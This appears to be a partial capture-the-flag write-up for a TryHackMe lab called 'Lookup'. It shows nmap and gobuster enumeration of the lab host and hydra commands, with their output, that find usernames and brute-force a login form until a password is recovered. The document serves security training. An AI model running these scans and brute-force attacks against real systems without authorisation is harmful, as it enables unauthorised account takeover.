# $${\color{red}NOTE}$$
I have to do this before enter the enumeration phase
```
sudo nano /etc/hosts
```
and add `{ip} lookup.thm` at the end of the file in order to access to the site

## Enumeration 
Using `nmap` to kickstart the process
```
 nmap -T4 -sV -v -O -A -Pn 10.10.97.100 -oN nmap.txt
```
$${\color{red}NOTE}$$ : 10.10.97.100 in my case is the ip of the lookup.thm
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 13.705 days (since Thu May 15 06:07:54 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I knew that `22` and `80` are open which mean that I can acces the site via port `80`
Then using `gobuster` to gather directory necessary 
```
gobuster dir -u "http://lookup.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js,.txt -t 1000 2>/dev/null
```
!Not much directories gathered after executing `gobuster`

After accessing the site, there was a login page => implementing brute-force attack
Using `hydra` to brute-force attack, but I had to look for the username first 

```
hydra -p aaaaa -L /usr/share/wordlists/seclists/Usernames/Names/names.txt lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:username'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-28 22:42:09
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:username
[80][http-post-form] host: lookup.thm   login: admin   password: aaaaa
[STATUS] 579.00 tries/min, 579 tries in 00:01h, 9598 to do in 00:17h, 16 active
[STATUS] 578.33 tries/min, 1735 tries in 00:03h, 8442 to do in 00:15h, 16 active
[STATUS] 564.57 tries/min, 3952 tries in 00:07h, 6225 to do in 00:12h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: aaaaa
[STATUS] 562.50 tries/min, 6750 tries in 00:12h, 3427 to do in 00:07h, 16 active
[STATUS] 566.41 tries/min, 9629 tries in 00:17h, 548 to do in 00:01h, 16 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-28 23:00:16
```
Credentials gained:
username: `admin`, `jose`
After having the usernames, I continued finding the passwords for each of them.
$${\color{red}NOTE}$$ : brute-forcing with `jose` first
```
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:Wrong'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-28 22:52:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong
[STATUS] 552.00 tries/min, 552 tries in 00:01h, 14343847 to do in 433:06h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-28 22:55:05
```
I found the credentials for `jose`, then logging to the site

